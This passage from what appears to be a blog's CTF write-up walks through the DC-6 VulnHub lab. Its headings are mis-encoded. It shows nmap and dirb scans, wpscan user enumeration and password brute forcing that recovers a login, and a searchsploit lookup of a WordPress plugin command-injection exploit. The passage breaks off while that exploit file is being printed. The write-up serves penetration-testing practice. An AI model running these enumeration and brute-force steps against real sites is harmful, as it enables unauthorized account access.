class="string">Congratulations!!!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Hope you enjoyed DC-7.  Just wanted to send a big thanks out there to all those</span></span><br><span class="line"><span class="string">who have provided feedback, and all those who have taken the time to complete these little</span></span><br><span class="line"><span class="string">challenges.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">I&#x27;</span>m sending out an especially big thanks to:</span><br><span class="line"></span><br><span class="line">@4nqr34z</span><br><span class="line">@D4mianWayne</span><br><span class="line">@0xmzfr</span><br><span class="line">@theart42</span><br><span class="line"></span><br><span class="line">If you enjoyed this CTF, send me a tweet via @DCAU7.</span><br><span class="line"></span><br><span class="line">root@dc-7:~<span class="comment">#</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>vulnhub</category>
        <category>DC</category>
      </categories>
      <tags>
        <tag>é¶æœº</tag>
      </tags>
  </entry>
  <entry>
    <title>DC-6</title>
    <url>/2020/08/27/DC-6/</url>
    <content><![CDATA[<h2 id="0x00-å®˜ç½‘æè¿°"><a href="#0x00-å®˜ç½‘æè¿°" class="headerlink" title="0x00.å®˜ç½‘æè¿°"></a>0x00.å®˜ç½‘æè¿°</h2><blockquote>
<p>DC-6 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.</p>
<p>This isnâ€™t an overly difficult challenge so should be great for beginners.</p>
<p>The ultimate goal of this challenge is to get root and to read the one and only flag.</p>
<p>Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.</p>
<p>For beginners, Google can be of great assistance, but you can always tweet me at @DCAU7 for assistance to get you going again. But take note: I wonâ€™t give you the answer, instead, Iâ€™ll give you an idea about how to move forward.</p>
</blockquote>
<a id="more"></a>

<h2 id="0x01-è€è§„çŸ©nmap"><a href="#0x01-è€è§„çŸ©nmap" class="headerlink" title="0x01.è€è§„çŸ©nmap"></a>0x01.è€è§„çŸ©nmap</h2><p><code>å¯ä»¥å‘ç°1ä¸ºç½‘å…³ï¼Œ2ä¸ºå®¿ä¸»æœºï¼Œ6ä¸ºkaliï¼Œé‚£ä¹ˆ3å°±æ˜¯æˆ‘ä»¬çš„å—å®³è€…</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/tmp/dc6<span class="comment"># nmap -sP 192.168.1.0/24 -oN nmap.sP</span></span><br><span class="line"><span class="comment"># Nmap 7.80 scan initiated Thu Aug 27 02:09:08 2020 as: nmap -sP -oN nmap.sP 192.168.1.0/24</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.1</span><br><span class="line">Host is up (0.0028s latency).</span><br><span class="line">MAC Address: 68:D1:BA:1F:FD:48 (Shenzhen Youhua Technology)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.2</span><br><span class="line">Host is up (0.00040s latency).</span><br><span class="line">MAC Address: 50:5B:C2:8C:BE:A5 (Liteon Technology)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.3</span><br><span class="line">Host is up (0.00031s latency).</span><br><span class="line">MAC Address: 00:0C:29:2B:C3:13 (VMware)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.6</span><br><span class="line">Host is up.</span><br><span class="line"><span class="comment"># Nmap done at Thu Aug 27 02:09:10 2020 -- 256 IP addresses (4 hosts up) scanned in 2.06 seconds</span></span><br></pre></td></tr></table></figure>

<h2 id="0x02-ç»§ç»­nmapæ‰«ææœåŠ¡åŠç«¯å£"><a href="#0x02-ç»§ç»­nmapæ‰«ææœåŠ¡åŠç«¯å£" class="headerlink" title="0x02.ç»§ç»­nmapæ‰«ææœåŠ¡åŠç«¯å£"></a>0x02.ç»§ç»­nmapæ‰«ææœåŠ¡åŠç«¯å£</h2><p><code>å¯ä»¥å‘ç°å¼€æ”¾äº†22/80ç«¯å£ï¼Œä¸”wordpressçš„ç‰ˆæœ¬ä¸º5.1.1</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/dc6<span class="comment"># nmap -sC -sV -v 192.168.1.3 -oN nmap.demo</span></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-27 03:05 EDT</span><br><span class="line">NSE: Loaded 151 scripts <span class="keyword">for</span> scanning.</span><br><span class="line">NSE: Script Pre-scanning.</span><br><span class="line">Initiating NSE at 03:05</span><br><span class="line">Completed NSE at 03:05, 0.00s elapsed</span><br><span class="line">Initiating NSE at 03:05</span><br><span class="line">Completed NSE at 03:05, 0.00s elapsed</span><br><span class="line">Initiating NSE at 03:05</span><br><span class="line">Completed NSE at 03:05, 0.00s elapsed</span><br><span class="line">Initiating ARP Ping Scan at 03:05</span><br><span class="line">Scanning 192.168.1.3 [1 port]</span><br><span class="line">Completed ARP Ping Scan at 03:05, 0.03s elapsed (1 total hosts)</span><br><span class="line">Initiating SYN Stealth Scan at 03:05</span><br><span class="line">Scanning wordy (192.168.1.3) [1000 ports]</span><br><span class="line">Discovered open port 80/tcp on 192.168.1.3</span><br><span class="line">Discovered open port 22/tcp on 192.168.1.3</span><br><span class="line">Completed SYN Stealth Scan at 03:05, 0.07s elapsed (1000 total ports)</span><br><span class="line">Initiating Service scan at 03:05</span><br><span class="line">Scanning 2 services on wordy (192.168.1.3)</span><br><span class="line">Completed Service scan at 03:05, 6.08s elapsed (2 services on 1 host)</span><br><span class="line">NSE: Script scanning 192.168.1.3.</span><br><span class="line">Initiating NSE at 03:05</span><br><span class="line">Completed NSE at 03:05, 0.63s elapsed</span><br><span class="line">Initiating NSE at 03:05</span><br><span class="line">Completed NSE at 03:05, 0.02s elapsed</span><br><span class="line">Initiating NSE at 03:05</span><br><span class="line">Completed NSE at 03:05, 0.00s elapsed</span><br><span class="line">Nmap scan report <span class="keyword">for</span> wordy (192.168.1.3)</span><br><span class="line">Host is up (0.000092s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 3e:52:ce:ce:01:b6:94:eb:7b:03:7d:be:08:7f:5f:fd (RSA)</span><br><span class="line">|   256 3c:83:65:71:dd:73:d7:23:f8:83:0d:e3:46:bc:b5:6f (ECDSA)</span><br><span class="line">|_  256 41:89:9e:85:ae:30:5b:e0:8f:a4:68:71:06:b4:15:ee (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.25 ((Debian))</span><br><span class="line">|_http-generator: WordPress 5.1.1</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|_http-server-header: Apache/2.4.25 (Debian)</span><br><span class="line">|_http-title: Wordy &amp;<span class="comment">#8211; Just another WordPress site</span></span><br><span class="line">|_https-redirect: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">MAC Address: 00:0C:29:2B:C3:13 (VMware)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">NSE: Script Post-scanning.</span><br><span class="line">Initiating NSE at 03:05</span><br><span class="line">Completed NSE at 03:05, 0.00s elapsed</span><br><span class="line">Initiating NSE at 03:05</span><br><span class="line">Completed NSE at 03:05, 0.00s elapsed</span><br><span class="line">Initiating NSE at 03:05</span><br><span class="line">Completed NSE at 03:05, 0.00s elapsed</span><br><span class="line">Read data files from: /usr/bin/../share/nmap</span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 7.28 seconds</span><br><span class="line">           Raw packets sent: 1001 (44.028KB) | Rcvd: 1001 (40.036KB)</span><br><span class="line">root@JIYE:~/vulnhub/dc6<span class="comment"># </span></span><br></pre></td></tr></table></figure>

<h2 id="0x03-å‘ç°80ç«¯å£ï¼Œç›´æ¥è®¿é—®"><a href="#0x03-å‘ç°80ç«¯å£ï¼Œç›´æ¥è®¿é—®" class="headerlink" title="0x03.å‘ç°80ç«¯å£ï¼Œç›´æ¥è®¿é—®"></a>0x03.å‘ç°80ç«¯å£ï¼Œç›´æ¥è®¿é—®</h2><h3 id="1-å‘ç°æ— æ³•æ‰“å¼€ä¸”é‡å®šå‘åˆ°wordy"><a href="#1-å‘ç°æ— æ³•æ‰“å¼€ä¸”é‡å®šå‘åˆ°wordy" class="headerlink" title="1.å‘ç°æ— æ³•æ‰“å¼€ä¸”é‡å®šå‘åˆ°wordy"></a>1.å‘ç°æ— æ³•æ‰“å¼€ä¸”é‡å®šå‘åˆ°wordy</h3><img src="/2020/08/27/DC-6/image-20200827142739115.png" class>

<h3 id="2-ä¿®æ”¹hostsæ–‡ä»¶ï¼Œå†æ¬¡è®¿é—®ï¼Œå‘ç°æåˆ°äº†æ’ä»¶"><a href="#2-ä¿®æ”¹hostsæ–‡ä»¶ï¼Œå†æ¬¡è®¿é—®ï¼Œå‘ç°æåˆ°äº†æ’ä»¶" class="headerlink" title="2.ä¿®æ”¹hostsæ–‡ä»¶ï¼Œå†æ¬¡è®¿é—®ï¼Œå‘ç°æåˆ°äº†æ’ä»¶"></a>2.ä¿®æ”¹hostsæ–‡ä»¶ï¼Œå†æ¬¡è®¿é—®ï¼Œå‘ç°æåˆ°äº†æ’ä»¶</h3><img src="/2020/08/27/DC-6/image-20200827152505172.png" class>

<h3 id="3-æ‰«æwordpressç›®å½•"><a href="#3-æ‰«æwordpressç›®å½•" class="headerlink" title="3.æ‰«æwordpressç›®å½•"></a>3.æ‰«æwordpressç›®å½•</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/dc6<span class="comment"># dirb http://wordy</span></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line">START_TIME: Thu Aug 27 02:19:37 2020</span><br><span class="line">URL_BASE: http://wordy/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line">-----------------</span><br><span class="line">GENERATED WORDS: 4612                                                          </span><br><span class="line">---- Scanning URL: http://wordy/ ----</span><br><span class="line">+ http://wordy/index.php (CODE:301|SIZE:0)                                           </span><br><span class="line">+ http://wordy/server-status (CODE:403|SIZE:293)                                     </span><br><span class="line">==&gt; DIRECTORY: http://wordy/wp-admin/                                               </span><br><span class="line">==&gt; DIRECTORY: http://wordy/wp-content/                                             </span><br><span class="line">==&gt; DIRECTORY: http://wordy/wp-includes/                                             </span><br><span class="line">+ http://wordy/xmlrpc.php (CODE:405|SIZE:42)                                         </span><br><span class="line">---- Entering directory: http://wordy/wp-admin/ ----</span><br><span class="line">+ http://wordy/wp-admin/admin.php (CODE:302|SIZE:0)                                 </span><br><span class="line">==&gt; DIRECTORY: http://wordy/wp-admin/css/                                          </span><br><span class="line">==&gt; DIRECTORY: http://wordy/wp-admin/images/                                         </span><br><span class="line">==&gt; DIRECTORY: http://wordy/wp-admin/includes/   </span><br><span class="line">+ http://wordy/wp-admin/index.php (CODE:302|SIZE:0)                                 </span><br><span class="line">==&gt; DIRECTORY: http://wordy/wp-admin/js/</span><br><span class="line">==&gt; DIRECTORY: http://wordy/wp-admin/maint/                                         </span><br><span class="line">==&gt; DIRECTORY: http://wordy/wp-admin/network/                                       </span><br><span class="line">==&gt; DIRECTORY: http://wordy/wp-admin/user/                                           </span><br><span class="line">---- Entering directory: http://wordy/wp-content/ ----</span><br><span class="line">+ http://wordy/wp-content/index.php (CODE:200|SIZE:0)                               </span><br><span class="line">==&gt; DIRECTORY: http://wordy/wp-content/plugins/                                     </span><br><span class="line">==&gt; DIRECTORY: http://wordy/wp-content/themes/                                      </span><br><span class="line">---- Entering directory: http://wordy/wp-includes/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.                        </span><br><span class="line">    (Use mode <span class="string">&#x27;-w&#x27;</span> <span class="keyword">if</span> you want to scan it anyway)                                   </span><br><span class="line">---- Entering directory: http://wordy/wp-admin/css/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.                        </span><br><span class="line">    (Use mode <span class="string">&#x27;-w&#x27;</span> <span class="keyword">if</span> you want to scan it anyway)                                   </span><br><span class="line">---- Entering directory: http://wordy/wp-admin/images/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.                        </span><br><span class="line">    (Use mode <span class="string">&#x27;-w&#x27;</span> <span class="keyword">if</span> you want to scan it anyway)</span><br><span class="line">---- Entering directory: http://wordy/wp-admin/includes/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.                        </span><br><span class="line">    (Use mode <span class="string">&#x27;-w&#x27;</span> <span class="keyword">if</span> you want to scan it anyway)</span><br><span class="line">---- Entering directory: http://wordy/wp-admin/js/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.                        </span><br><span class="line">    (Use mode <span class="string">&#x27;-w&#x27;</span> <span class="keyword">if</span> you want to scan it anyway)                                   </span><br><span class="line">---- Entering directory: http://wordy/wp-admin/maint/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.                        </span><br><span class="line">    (Use mode <span class="string">&#x27;-w&#x27;</span> <span class="keyword">if</span> you want to scan it anyway)</span><br><span class="line">---- Entering directory: http://wordy/wp-admin/network/ ----</span><br><span class="line">+ http://wordy/wp-admin/network/admin.php (CODE:302|SIZE:0)                         </span><br><span class="line">+ http://wordy/wp-admin/network/index.php (CODE:302|SIZE:0)                         </span><br><span class="line">---- Entering directory: http://wordy/wp-admin/user/ ----</span><br><span class="line">+ http://wordy/wp-admin/user/admin.php (CODE:302|SIZE:0)                             </span><br><span class="line">+ http://wordy/wp-admin/user/index.php (CODE:302|SIZE:0)                             </span><br><span class="line">---- Entering directory: http://wordy/wp-content/plugins/ ----</span><br><span class="line">+ http://wordy/wp-content/plugins/index.php (CODE:200|SIZE:0)                       </span><br><span class="line">---- Entering directory: http://wordy/wp-content/themes/ ----</span><br><span class="line">+ http://wordy/wp-content/themes/index.php (CODE:200|SIZE:0)</span><br><span class="line">-----------------</span><br><span class="line">END_TIME: Thu Aug 27 02:20:11 2020</span><br><span class="line">DOWNLOADED: 32284 - FOUND: 12</span><br><span class="line">root@JIYE:~/vulnhub/dc6<span class="comment"># </span></span><br></pre></td></tr></table></figure>

<h3 id="4-è®¿é—®wp-adminï¼Œé‡å®šå‘åˆ°wp-login-php"><a href="#4-è®¿é—®wp-adminï¼Œé‡å®šå‘åˆ°wp-login-php" class="headerlink" title="4.è®¿é—®wp-adminï¼Œé‡å®šå‘åˆ°wp-login.php"></a>4.è®¿é—®wp-adminï¼Œé‡å®šå‘åˆ°wp-login.php</h3><img src="/2020/08/27/DC-6/image-20200827143602089.png" class>

<h3 id="5-æ‰«æç”¨æˆ·"><a href="#5-æ‰«æç”¨æˆ·" class="headerlink" title="5.æ‰«æç”¨æˆ·"></a>5.æ‰«æç”¨æˆ·</h3><p><code>å‘ç°äº”ä¸ªç”¨æˆ·ï¼Œadmin,jens,graham,mark,sarah</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/dc6<span class="comment"># wpscan --url wordy -e u</span></span><br><span class="line">_______________________________________________________________</span><br><span class="line">         __          _______   _____</span><br><span class="line">         \ \        / /  __ \ / ____|</span><br><span class="line">          \ \  /\  / /| |__) | (___   ___  __ _ _ __ Â®</span><br><span class="line">           \ \/  \/ / |  ___/ \___ \ / __|/ _` | <span class="string">&#x27;_ \</span></span><br><span class="line"><span class="string">            \  /\  /  | |     ____) | (__| (_| | | | |</span></span><br><span class="line"><span class="string">             \/  \/   |_|    |_____/ \___|\__,_|_| |_|</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">         WordPress Security Scanner by the WPScan Team</span></span><br><span class="line"><span class="string">                         Version 3.8.4</span></span><br><span class="line"><span class="string">       Sponsored by Automattic - https://automattic.com/</span></span><br><span class="line"><span class="string">       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart</span></span><br><span class="line"><span class="string">_______________________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] URL: http://wordy/ [192.168.1.3]</span></span><br><span class="line"><span class="string">[+] Started: Thu Aug 27 03:27:20 2020</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Interesting Finding(s):</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Headers</span></span><br><span class="line"><span class="string"> | Interesting Entry: Server: Apache/2.4.25 (Debian)</span></span><br><span class="line"><span class="string"> | Found By: Headers (Passive Detection)</span></span><br><span class="line"><span class="string"> | Confidence: 100%</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] XML-RPC seems to be enabled: http://wordy/xmlrpc.php</span></span><br><span class="line"><span class="string"> | Found By: Direct Access (Aggressive Detection)</span></span><br><span class="line"><span class="string"> | Confidence: 100%</span></span><br><span class="line"><span class="string"> | References:</span></span><br><span class="line"><span class="string"> |  - http://codex.wordpress.org/XML-RPC_Pingback_API</span></span><br><span class="line"><span class="string"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner</span></span><br><span class="line"><span class="string"> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos</span></span><br><span class="line"><span class="string"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login</span></span><br><span class="line"><span class="string"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] http://wordy/readme.html</span></span><br><span class="line"><span class="string"> | Found By: Direct Access (Aggressive Detection)</span></span><br><span class="line"><span class="string"> | Confidence: 100%</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] The external WP-Cron seems to be enabled: http://wordy/wp-cron.php</span></span><br><span class="line"><span class="string"> | Found By: Direct Access (Aggressive Detection)</span></span><br><span class="line"><span class="string"> | Confidence: 60%</span></span><br><span class="line"><span class="string"> | References:</span></span><br><span class="line"><span class="string"> |  - https://www.iplocation.net/defend-wordpress-from-ddos</span></span><br><span class="line"><span class="string"> |  - https://github.com/wpscanteam/wpscan/issues/1299</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] WordPress version 5.1.1 identified (Insecure, released on 2019-03-13).</span></span><br><span class="line"><span class="string"> | Found By: Rss Generator (Passive Detection)</span></span><br><span class="line"><span class="string"> |  - http://wordy/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=5.1.1&lt;/generator&gt;</span></span><br><span class="line"><span class="string"> |  - http://wordy/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=5.1.1&lt;/generator&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] WordPress theme in use: twentyseventeen</span></span><br><span class="line"><span class="string"> | Location: http://wordy/wp-content/themes/twentyseventeen/</span></span><br><span class="line"><span class="string"> | Last Updated: 2020-08-11T00:00:00.000Z</span></span><br><span class="line"><span class="string"> | Readme: http://wordy/wp-content/themes/twentyseventeen/README.txt</span></span><br><span class="line"><span class="string"> | [!] The version is out of date, the latest version is 2.4</span></span><br><span class="line"><span class="string"> | Style URL: http://wordy/wp-content/themes/twentyseventeen/style.css?ver=5.1.1</span></span><br><span class="line"><span class="string"> | Style Name: Twenty Seventeen</span></span><br><span class="line"><span class="string"> | Style URI: https://wordpress.org/themes/twentyseventeen/</span></span><br><span class="line"><span class="string"> | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...</span></span><br><span class="line"><span class="string"> | Author: the WordPress team</span></span><br><span class="line"><span class="string"> | Author URI: https://wordpress.org/</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | Found By: Css Style In Homepage (Passive Detection)</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | Version: 2.1 (80% confidence)</span></span><br><span class="line"><span class="string"> | Found By: Style (Passive Detection)</span></span><br><span class="line"><span class="string"> |  - http://wordy/wp-content/themes/twentyseventeen/style.css?ver=5.1.1, Match: &#x27;</span>Version: 2.1<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Enumerating Users (via Passive and Aggressive Methods)</span></span><br><span class="line"><span class="string"> Brute Forcing Author IDs - Time: 00:00:00 &lt;====================================================================&gt; (10 / 10) 100.00% Time: 00:00:00</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[i] User(s) Identified:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] admin</span></span><br><span class="line"><span class="string"> | Found By: Rss Generator (Passive Detection)</span></span><br><span class="line"><span class="string"> | Confirmed By:</span></span><br><span class="line"><span class="string"> |  Wp Json Api (Aggressive Detection)</span></span><br><span class="line"><span class="string"> |   - http://wordy/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1</span></span><br><span class="line"><span class="string"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span></span><br><span class="line"><span class="string"> |  Login Error Messages (Aggressive Detection)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] jens</span></span><br><span class="line"><span class="string"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span></span><br><span class="line"><span class="string"> | Confirmed By: Login Error Messages (Aggressive Detection)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] graham</span></span><br><span class="line"><span class="string"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span></span><br><span class="line"><span class="string"> | Confirmed By: Login Error Messages (Aggressive Detection)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] mark</span></span><br><span class="line"><span class="string"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span></span><br><span class="line"><span class="string"> | Confirmed By: Login Error Messages (Aggressive Detection)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] sarah</span></span><br><span class="line"><span class="string"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span></span><br><span class="line"><span class="string"> | Confirmed By: Login Error Messages (Aggressive Detection)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.</span></span><br><span class="line"><span class="string">[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Finished: Thu Aug 27 03:27:23 2020</span></span><br><span class="line"><span class="string">[+] Requests Done: 59</span></span><br><span class="line"><span class="string">[+] Cached Requests: 6</span></span><br><span class="line"><span class="string">[+] Data Sent: 13.316 KB</span></span><br><span class="line"><span class="string">[+] Data Received: 640.55 KB</span></span><br><span class="line"><span class="string">[+] Memory used: 176.484 MB</span></span><br><span class="line"><span class="string">[+] Elapsed time: 00:00:02</span></span><br><span class="line"><span class="string">root@JIYE:~/vulnhub/dc6# </span></span><br></pre></td></tr></table></figure>

<h2 id="0x04-çˆ†ç ´web-application"><a href="#0x04-çˆ†ç ´web-application" class="headerlink" title="0x04.çˆ†ç ´web application"></a>0x04.çˆ†ç ´web application</h2><h3 id="1-ç”Ÿæˆç”¨æˆ·å­—å…¸"><a href="#1-ç”Ÿæˆç”¨æˆ·å­—å…¸" class="headerlink" title="1.ç”Ÿæˆç”¨æˆ·å­—å…¸"></a>1.ç”Ÿæˆç”¨æˆ·å­—å…¸</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/dc6<span class="comment"># cat user.txt</span></span><br><span class="line">dmin</span><br><span class="line">jens</span><br><span class="line">graham</span><br><span class="line">mark</span><br><span class="line">sarah</span><br><span class="line">root@JIYE:~/vulnhub/dc6<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<h3 id="2-ç”Ÿæˆå¯†ç å­—å…¸"><a href="#2-ç”Ÿæˆå¯†ç å­—å…¸" class="headerlink" title="2.ç”Ÿæˆå¯†ç å­—å…¸"></a>2.ç”Ÿæˆå¯†ç å­—å…¸</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/dc6<span class="comment">#cat /usr/share/wordlists/rockyou.txt | grep k01 &gt; passwords.txt</span></span><br></pre></td></tr></table></figure>

<h3 id="3-çˆ†ç ´"><a href="#3-çˆ†ç ´" class="headerlink" title="3.çˆ†ç ´"></a>3.çˆ†ç ´</h3><p><code>å‘ç°markç”¨æˆ·å¯†ç ï¼šhelpdesk01</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/dc6<span class="comment"># wpscan --url wordy -U user.txt -P passwords.txt </span></span><br><span class="line">_______________________________________________________________</span><br><span class="line">         __          _______   _____</span><br><span class="line">         \ \        / /  __ \ / ____|</span><br><span class="line">          \ \  /\  / /| |__) | (___   ___  __ _ _ __ Â®</span><br><span class="line">           \ \/  \/ / |  ___/ \___ \ / __|/ _` | <span class="string">&#x27;_ \</span></span><br><span class="line"><span class="string">            \  /\  /  | |     ____) | (__| (_| | | | |</span></span><br><span class="line"><span class="string">             \/  \/   |_|    |_____/ \___|\__,_|_| |_|</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Trying graham / !lak019b Time: 00:02:30 &lt;======================================================            &gt; (12547 / 15215) 82.46%  ETA: ??:??:??</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[!] Valid Combinations Found:</span></span><br><span class="line"><span class="string"> | Username: mark, Password: helpdesk01</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.</span></span><br><span class="line"><span class="string">[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Finished: Thu Aug 27 03:38:29 2020</span></span><br><span class="line"><span class="string">[+] Requests Done: 12572</span></span><br><span class="line"><span class="string">[+] Cached Requests: 33</span></span><br><span class="line"><span class="string">[+] Data Sent: 5.874 MB</span></span><br><span class="line"><span class="string">[+] Data Received: 7.392 MB</span></span><br><span class="line"><span class="string">[+] Memory used: 232.938 MB</span></span><br><span class="line"><span class="string">[+] Elapsed time: 00:02:33</span></span><br><span class="line"><span class="string">root@JIYE:~/vulnhub/dc6# </span></span><br></pre></td></tr></table></figure>

<h2 id="0x05-ç™»å…¥ï¼Œæ‰‹åŠ¨çˆ¬è™«"><a href="#0x05-ç™»å…¥ï¼Œæ‰‹åŠ¨çˆ¬è™«" class="headerlink" title="0x05.ç™»å…¥ï¼Œæ‰‹åŠ¨çˆ¬è™«"></a>0x05.ç™»å…¥ï¼Œæ‰‹åŠ¨çˆ¬è™«</h2><p><code>å‘ç°ä¸€ä¸ªç›‘è§†æ’ä»¶</code></p>
<img src="/2020/08/27/DC-6/image-20200827155009784.png" class>

<p><code>å‰æ–‡è¯´æ’ä»¶æ˜¯å®‰å…¨çš„ï¼Œä¸‹é¢æŸ¥æ‰¾æ˜¯å¦æœ‰æ¼æ´</code></p>
<p><code>å‘ç°å­˜åœ¨ç»è¿‡èº«ä»½éªŒè¯çš„å‘½ä»¤æ³¨å…¥æ¼æ´</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/dc6<span class="comment"># searchsploit Activity Monitor</span></span><br><span class="line">---------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line"> Exploit Title                                                                                                  |  Path</span><br><span class="line">---------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">Activity Monitor 2002 2.6 - Remote Denial of Service                                                            | windows/dos/22690.c</span><br><span class="line">RedHat Linux 6.0/6.1/6.2 - <span class="string">&#x27;pam_console&#x27;</span> Monitor Activity After Logout                                          | linux/<span class="built_in">local</span>/19900.c</span><br><span class="line">WordPress Plugin Plainview Activity Monitor 20161228 - (Authenticated) Command Injection                        | php/webapps/45274.html</span><br><span class="line">---------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">Shellcodes: No Results</span><br><span class="line">root@JIYE:~/vulnhub/dc6<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<h2 id="0x06-æŸ¥çœ‹45274-htmlè¯´æ˜"><a href="#0x06-æŸ¥çœ‹45274-htmlè¯´æ˜" class="headerlink" title="0x06.æŸ¥çœ‹45274.htmlè¯´æ˜"></a>0x06.æŸ¥çœ‹45274.htmlè¯´æ˜</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/dc6<span class="comment"># cp /usr/share/exploitdb/exploits/php/webapps/45274.html .</span></span><br><span class="line">root@JIYE:~/vulnhub/dc6<span class="comment"># ls</span></span><br><span class="line">45274.html  48724.txt  nmap.A  nmap.demo  nmap.sP  passwords.txt  user.txt</span><br><span class="line">root@JIYE:~/vulnhub/dc6<span class="comment"># cat 45274.html </span></span><br><span class="line">&lt;!--</span><br><span class="line">About:</span><br><span class="line">===========</span><br><span class="line">Component: Plainview Activity Monitor (Wordpress plugin)</span><br><span class="line">Vulnerable version: 20161228 and possibly prior</span><br><span class="line">Fixed version: 20180826</span><br><span class="line">CVE-ID: CVE-2018-15877</span><br><span class="line">CWE-ID: CWE-78</span><br><span class="line">Author:</span><br><span class="line">- LydA(c)ric Lefebvre (https://www.linkedin.com/<span 